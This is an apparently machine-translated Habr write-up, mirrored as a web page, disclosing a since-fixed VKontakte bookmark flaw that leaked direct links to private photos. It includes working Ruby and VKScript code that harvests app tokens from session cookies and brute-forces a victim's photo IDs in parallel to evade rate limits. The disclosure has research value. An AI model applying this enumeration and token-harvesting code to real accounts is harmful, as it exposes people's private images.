<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Vulnerability "VKontakte" allows you to get direct links to private photos</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="tl; dr  A vulnerability was discovered in the VK tabs, which allowed to get direct links to private photos from personal messages, albums of any user ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Vulnerability "VKontakte" allows you to get direct links to private photos</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/68c/d2f/5d1/68cd2f5d1f3e47289c3534279d875e88.jpg" align="right"><br><br><div class="spoiler">  <b class="spoiler_title">tl; dr</b> <div class="spoiler_text">  A vulnerability was discovered in the VK tabs, which allowed to get direct links to private photos from personal messages, albums of any user / group.  A script was written that went through the user's photos for a certain period and then, through this vulnerability, received direct links to images.  In short, then: it was possible to get all your yesterday's photos in 1 minute, in 7 minutes - all photos uploaded last week, in 20 minutes - last month, in 2 hours - last year.  The vulnerability is currently fixed.  The administration of VKontakte paid a reward of 10k votes. <br></div></div><br>  The story began with the way in which I pushed an image in my VKontakte.  Usually, if the thing is important, I upload it to the cloud, but in my case there was no need for this, and I decided to use the Vkontakte bookmarks feature. <br><a name="habracut"></a><br>  Briefly about this functionality: all the things that the user likes have been added to the bookmarks;  there is also a function of manually adding a link to the user and the internal link "VKontakte".  The last point seemed to me very interesting, because after adding the link to the photo I saw its thumbnail and text with the type of the added entity: <br><br><img src="https://habrastorage.org/files/1e8/31f/55b/1e831f55bad543418b92c31148c69502.png">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      When adding a link, the server parses it, tries to figure out which entity it refers to and obtains information about this object from the database.  As a rule, when writing such functions with a variety of conditions, the likelihood that a developer will forget something is very high.  Therefore, I could not afford to pass by and decided to spend a few minutes to experiment a little. <br><br>  As a result, I managed to find something.  When adding a link to a photo, note or video that is not available, it was possible to get some private information about the object.  In the case of photos and videos, this is a small (150x150) thumbnail, on which it is quite difficult to see anything, the name was displayed for private notes.  Through the API method <i>fave.getLinks,</i> you could get links to the image, but again too small in size (75px and 130px).  So, in essence, nothing serious. <br><br>  I decided to go to the mobile version of the site to check whether everything is displayed there the same way as in the normal version.  Looking into the code page, I saw this: <br><br><img src="https://habrastorage.org/files/c87/051/1d8/c870511d804c4b0f8733e904fbbf7367.png"><br><br>  Yes!  The value of the <i>data-src_big attribute</i> kept a direct link to the original image! <br><br>  Thus, it was possible to get a direct link to any image in Vkontakte, regardless of where it was loaded and what privacy settings it had.  This could be an image from private messages or a photo from private albums of any user / group. <br><br>  It would seem that one could stop at that and write to the developers, but I wondered if it was possible, by exploiting this vulnerability, to get access to all (well, or uploaded in a certain period of time) user photos.  The main problem here, as you understand, was that the link to a private photo of the form <i>photoXXXXXX_XXXXXXX</i> , which should be bookmarked, is not always known.  The thought of searching for id pictures came into my head, but for some reason I immediately rejected it as crazy.  I checked the API-related methods in photos, looked at how the application works with albums, but I couldn‚Äôt find any leaks that could help me get a list with the IDs of all private photos of the user.  I already wanted to quit this venture, but looking again at the link with a photo, I suddenly realized that brute force was a good idea. <br><br><h2>  How photos work in VK </h2><br>  As you could replace, the link to the photo <i>photo52708106_359542386</i> consists of two parts: <i>(user id) _ (some incomprehensible number)</i> .  How is the second part formed? <br><br>  Alas, but after spending two hours on experiments, I did not understand.  In 2012, at HighLoad ++, Oleg Illarionov said a few words about how they store photos, horizontal sharding and random selection of a server to load, but this information did not give me anything, since there is no connection between the server id and id.  It is clear that there is a certain global counter, but there is still some kind of logic ... Because if the second number were formed using the usual autoincrement, then the ID values ‚Äã‚Äãof the photos would have already reached great values ‚Äã‚Äã(for example, at the moment 700 trillion), but Vkontakte has this value of only ~ 400 million (although, judging by the statistics, users upload more than 30 million photos <b>daily</b> ).  Those.  It is clear that this figure is not unique, but not random at the same time.  I wrote a script that went through the photographs of the ‚Äúold‚Äù users and, based on the data received, made a graph of how much this figure changed every <b>year</b> : <br><br><img src="https://habrastorage.org/files/998/c21/bce/998c21bcecb0454aa81a61af5b62ea2f.png"><br><br>  It can be seen that the values ‚Äã‚Äãjump depending on some factors (the number of servers or the new logic?).  But the bottom line is that they are quite small (especially over the last 2-3 years) and it is very easy to calculate the range of id for the desired time period.  That is, to find out direct links to pictures of the user, for example, last year, you need to try to add to bookmarks only 30 million (from _320000000 to _350000000) of different variations of links!  Below, I described a brute force technique that allowed me to do this in a matter of minutes. <br><br><h2>  Looking through photos </h2><br>  You could add it all by hand through the interface or write a script that adds one link to the bookmarks, but it would be boring and long.  In this case, the search speed would be 3 bookmarks per second, since  more than three requests per second to the server "Vkontakte" <a href="https://vk.com/dev/api_requests">can not be</a> sent. <br><br><h3>  Accelerate brute force x25 </h3><br>  To get around a limit of 3 requests at least a bit, I decided to use the <a href="https://vk.com/dev/execute">execute</a> method.  In one call to this method, there are 25 calls to API methods. <br><br><pre><code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> start = <span class="hljs-built_in"><span class="hljs-built_in">parseInt</span></span>(Args.start); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> end = <span class="hljs-built_in"><span class="hljs-built_in">parseInt</span></span>(Args.end); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> victimId = Args.id; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> link = <span class="hljs-string"><span class="hljs-string">"http://vk.com/photo"</span></span> + victimId + <span class="hljs-string"><span class="hljs-string">"_"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(start != end) { API.fave.addLink({ <span class="hljs-string"><span class="hljs-string">"link"</span></span>: link + start }); start = start + <span class="hljs-number"><span class="hljs-number">1</span></span>; };</code> </pre> <br>  Thereby it was possible to increase the speed of brute force to 3 * 25 bookmarks / sec.  Over the past year, the photos would have been taken a long time, but for short periods this brute force method was already quite good. <br><br><h3>  Accelerate brute force x25 * number of parallel requests per second </h3><br>  The limit on the number of requests / sec applies to each application separately, and not to the entire user.  So nothing prevents you from sending many requests in parallel, but at the same time using tokens from different applications. <br><br>  To begin with, it was necessary to find (or create) the necessary number of applications.  A script was written that looks for standalone applications in a given interval of application identifiers: <br><br><pre> <code class="ruby hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">StandaloneAppsFinder</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">attr_reader</span></span></span><span class="hljs-class"> :</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">app_ids</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">def</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">initialize</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">params</span></span></span><span class="hljs-class">) @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">range</span></span></span><span class="hljs-class"> = </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">params</span></span></span><span class="hljs-class">[:</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">in_range</span></span></span><span class="hljs-class">] @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">app_ids</span></span></span><span class="hljs-class"> = [] </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">end</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">def</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">search</span></span></span><span class="hljs-class"> (@</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">range</span></span></span><span class="hljs-class">).</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">each</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">do</span></span></span><span class="hljs-class"> |</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">app_id</span></span></span><span class="hljs-class">| </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">response</span></span></span><span class="hljs-class"> = </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">open</span></span></span><span class="hljs-class">("</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">https</span></span></span><span class="hljs-class">://</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">api</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">vk</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">com</span></span></span><span class="hljs-class">/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">method</span></span></span><span class="hljs-class">/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">apps</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">get?</span></span></span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">app_id</span></span></span><span class="hljs-class">=</span><span class="hljs-comment"><span class="hljs-class"><span class="hljs-comment">#{app_id}").read app = JSON.parse(response)['response'] app_ids &lt;&lt; app_id if standalone?(app) end end private def standalone?(app_data) app_data['type'] == 'standalone' end end</span></span></span></span></code> </pre><br>  It was still possible to select applications by the number of users in order to further speed up the further search: <br><blockquote>  If the application has installed less than 10,000 people, then you can make 5 requests per second, up to 100,000 - 8 requests, up to 1,000,000 - 20 requests, more than 1 million - 35 requests per second. <br>  <a href="https://vk.com/dev/api_requests">[Limitations and recommendations]</a> <br></blockquote><br>  But I decided not to bother with it. <br><br>  Ok, the applications are found, now they need to give permission to the data of our user and get tokens.  For authorization, I had to use the Implicit Flow mechanism.  I had to parse the authorization URL from the OAuth dialog and, after the redirect, pull out the token.  This class requires cookies <i>p, l</i> (login.vk.com) and <i>remixsid</i> (vk.com): <br><br><pre> <code class="ruby hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Authenticator</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">attr_reader</span></span></span><span class="hljs-class"> :</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">access_tokens</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">def</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">initialize</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">cookie_header</span></span></span><span class="hljs-class">) @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">cookies</span></span></span><span class="hljs-class"> = { '</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Cookie</span></span></span><span class="hljs-class">' =&gt; </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">cookie_header</span></span></span><span class="hljs-class"> } @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">access_tokens</span></span></span><span class="hljs-class"> = [] </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">end</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">def</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">authorize_apps</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">apps</span></span></span><span class="hljs-class">) </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">apps</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">each</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">do</span></span></span><span class="hljs-class"> |</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">app_id</span></span></span><span class="hljs-class">| </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">auth_url</span></span></span><span class="hljs-class"> = </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">extract_auth_url_from</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oauth_page</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">app_id</span></span></span><span class="hljs-class">)) </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">redirect_url</span></span></span><span class="hljs-class"> = </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">open</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">auth_url</span></span></span><span class="hljs-class">, @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">cookies</span></span></span><span class="hljs-class">).</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">base_uri</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">to_s</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">access_tokens</span></span></span><span class="hljs-class"> &lt;&lt; extract_token_from(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">redirect_url</span></span></span><span class="hljs-class">) </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">end</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">end</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">private</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">def</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">extract_auth_url_from</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oauth_page_html</span></span></span><span class="hljs-class">) </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Nokogiri::HTML</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oauth_page_html</span></span></span><span class="hljs-class">).</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">css</span></span></span><span class="hljs-class">('</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">form</span></span></span><span class="hljs-class">').</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">attr</span></span></span><span class="hljs-class">('</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">action</span></span></span><span class="hljs-class">').</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">value</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">end</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">def</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">extract_token_from</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">url</span></span></span><span class="hljs-class">) </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">URI</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">url</span></span></span><span class="hljs-class">).</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">fragment</span></span></span><span class="hljs-class">[13..97] </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">end</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">def</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oauth_page</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">app_id</span></span></span><span class="hljs-class">) </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">open</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oauth_page_url</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">app_id</span></span></span><span class="hljs-class">), @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">cookies</span></span></span><span class="hljs-class">).</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">read</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">end</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">def</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oauth_page_url</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">app_id</span></span></span><span class="hljs-class">) "</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">https</span></span></span><span class="hljs-class">://</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oauth</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">vk</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">com</span></span></span><span class="hljs-class">/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">authorize?</span></span></span><span class="hljs-class">" + "</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">client_id</span></span></span><span class="hljs-class">=</span><span class="hljs-comment"><span class="hljs-class"><span class="hljs-comment">#{app_id}&amp;" + "response_type=token&amp;" + "display=mobile&amp;" + "scope=474367" end end</span></span></span></span></code> </pre><br>  How many applications are found, so many parallel queries.  For the parallelization of this whole case, it was decided to use the <a href="https://github.com/typhoeus/typhoeus">Typhoeus</a> gem, which has proven itself in other tasks.  It turned out such a small brute forcer: <br><br><pre> <code class="ruby hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PhotosBruteforcer</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PHOTOS_ID_BY_PERIOD</span></span></span><span class="hljs-class"> = { '</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">today</span></span></span><span class="hljs-class">' =&gt; 366300000..366500000, '</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">yesterday</span></span></span><span class="hljs-class">' =&gt; 366050000..366300000, '</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">current_month</span></span></span><span class="hljs-class">' =&gt; 365000000..366500000, '</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">last_month</span></span></span><span class="hljs-class">' =&gt; 360000000..365000000, '</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">current_year</span></span></span><span class="hljs-class">' =&gt; 350000000..366500000, '</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">last_year</span></span></span><span class="hljs-class">' =&gt; 320000000..350000000 } </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">def</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">initialize</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">params</span></span></span><span class="hljs-class">) @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">victim_id</span></span></span><span class="hljs-class"> = </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">params</span></span></span><span class="hljs-class">[:</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">victim_id</span></span></span><span class="hljs-class">] @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">period</span></span></span><span class="hljs-class"> = </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PHOTOS_ID_BY_PERIOD</span></span></span><span class="hljs-class">[</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">params</span></span></span><span class="hljs-class">[:</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">period</span></span></span><span class="hljs-class">]] </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">end</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">def</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">run</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">tokens</span></span></span><span class="hljs-class">) </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">hydra</span></span></span><span class="hljs-class"> = </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Typhoeus::Hydra</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">new</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">tokensIterator</span></span></span><span class="hljs-class"> = 0 (@</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">period</span></span></span><span class="hljs-class">).</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">step</span></span></span><span class="hljs-class">(25) </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">do</span></span></span><span class="hljs-class"> |</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">photo_id</span></span></span><span class="hljs-class">| </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">url</span></span></span><span class="hljs-class"> = "</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">https</span></span></span><span class="hljs-class">://</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">api</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">vk</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">com</span></span></span><span class="hljs-class">/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">method</span></span></span><span class="hljs-class">/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">execute?</span></span></span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">access_token</span></span></span><span class="hljs-class">=</span><span class="hljs-comment"><span class="hljs-class"><span class="hljs-comment">#{tokens[tokensIterator]}&amp;code=#{vkscript(photo_id)}" encoded_url = URI.escape(url).gsub('+', '%2B').delete("\n") tokensIterator = tokensIterator == tokens.count - 1 ? 0 : tokensIterator + 1 hydra.queue Typhoeus::Request.new encoded_url hydra.run if tokensIterator.zero? end hydra.run unless hydra.queued_requests.count.zero? end private def vkscript(photo_id) &lt;&lt;-VKScript var start = #{photo_id}; var end = #{photo_id + 25}; var link = "http://vk.com/photo#{</span></span><span class="hljs-doctag"><span class="hljs-class"><span class="hljs-comment"><span class="hljs-doctag">@victim</span></span></span></span><span class="hljs-class"><span class="hljs-comment">_id}" + "_"; while(start != end) { API.fave.addLink({ "link": link + start }); start = start + 1; }; return start; VKScript end end</span></span></span></span></code> </pre><br>  To further speed up the brute force, there was an attempt to get rid of the unnecessary body in the response, but on the <i>HEAD</i> request, the server ‚ÄúVkontakte‚Äù returns the error <i>501 Not implemented</i> . <br><br>  The final version of the script looks like this: <br><br><pre> <code class="ruby hljs"><span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'nokogiri'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'open-uri'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'typhoeus'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'json'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'./standalone_apps_finder'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'./photos_bruteforcer'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'./authenticator'</span></span> bruteforcer = PhotosBruteforcer.new(<span class="hljs-symbol"><span class="hljs-symbol">victim_id:</span></span> ARGV[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-symbol"><span class="hljs-symbol">period:</span></span> ARGV[<span class="hljs-number"><span class="hljs-number">1</span></span>]) apps_finder = StandaloneAppsFinder.new(<span class="hljs-symbol"><span class="hljs-symbol">in_range:</span></span> <span class="hljs-number"><span class="hljs-number">4800000</span></span>..<span class="hljs-number"><span class="hljs-number">4800500</span></span>) apps_finder.search <span class="hljs-comment"><span class="hljs-comment"># p,l - cookies from login.vk.com # remixsid - cookie from vk.com authenticator = Authenticator.new( 'p=;' + 'l=;' + 'remixsid=;' ) authenticator.authorize_apps(apps_finder.app_ids) bruteforcer.run(authenticator.access_tokens)</span></span></code> </pre><br>  After working out the program in the bookmarks were all photos of the user for a specified period.  It only remained to go to the mobile version of ‚ÄúVkontakte‚Äù, open the browser console, pull out direct links and enjoy the photos in their original size. <br><br><iframe width="420" height="315" src="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://www.youtube.com/embed/8pjqOz4Tb8Y%3Ffeature%3Doembed&amp;xid=17259,15700022,15700186,15700190,15700248,15700253&amp;usg=ALkJrhjPH37H3p1itKBzJeImTOupc3FTJw" frameborder="0" allowfullscreen=""></iframe><br><br><h2>  Results </h2><br>  In general, everything depends on your Internet connection <s>and the speed of the proxy servers</s> , the latency of Vkontakte servers, processor power and many other factors.  After testing the script above on your account, I got these numbers here (without taking into account the time spent on getting tokens): <br><br><table><tbody><tr><th>  Period </th><th>  Time (minutes) </th></tr><tr><td>  Yesterday </td><td>  0.84 </td></tr><tr><td>  Last week </td><td>  6.9 </td></tr><tr><td>  Last month </td><td>  18.3 </td></tr><tr><td>  Last year </td><td>  121.1 </td></tr><tr><td>  Last 3 years </td><td>  312.5 </td></tr></tbody></table><br>  The table shows the average time required to try id photos for a certain period.  I am sure that all this could be speeded up at 10-20 times.  For example, in a brute force script, make one large queue of all requests and normal synchronization between them, since  In my implementation, a single request with a timeout will slow down the whole process.  Anyway, you could just buy a couple of instances on EC2, and get all the photos of any user in an hour.  But I already wanted to sleep. <br><br>  And in general, it does not matter how long the attacker spends on it, 5 hours or the whole day, because somehow he will get links to private images.  The ability to get access to private information in a finite time is the main threat posed by this vulnerability. <br><br><h2>  Reporting a vulnerability </h2><br>  At first, the report was sent to the support service, but after the answer of the form ‚Äúthank you, somehow we'll fix it probably ...‚Äù and a week of waiting, something became sad for me.  Many thanks to <a href="https://habrahabr.ru/users/bo0om/" class="user_link">Bo0oM</a> , who helped to contact the developers directly.  After that, the bugs were closed within a few hours, and after a few days, the administration transferred a reward of 10k <a href="https://vk.com/dev/partnership">votes</a> to my account. <br><br><img src="//habrastorage.org/files/3c9/fe5/fc8/3c9fe5fc8bbb4f6483e85138c39357a7.png"><br><br>  I never did a focused research on VC, but after such an almost accidental discovery of this vulnerability, I started seriously thinking about spending a few hours on a full-fledged audit of this social network.  VKontakte has no official bounty bug, so whitehat resellers bypass this site, while other, less ‚Äúwhite‚Äù hackers simply use bugs for their own purposes, or sell them.  So, I think, another couple of similar vulnerabilities in VC can be found. <br><br>  All good! </div><p>Source: <a href="https://habr.com/ru/post/257951/">https://habr.com/ru/post/257951/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../257941/index.html">LFS: The dark side of power. Part 2</a></li>
<li><a href="../257943/index.html">Budget device based on Arduino for the blind (open hardware)</a></li>
<li><a href="../257945/index.html">LoveQA mitap on RHS ++</a></li>
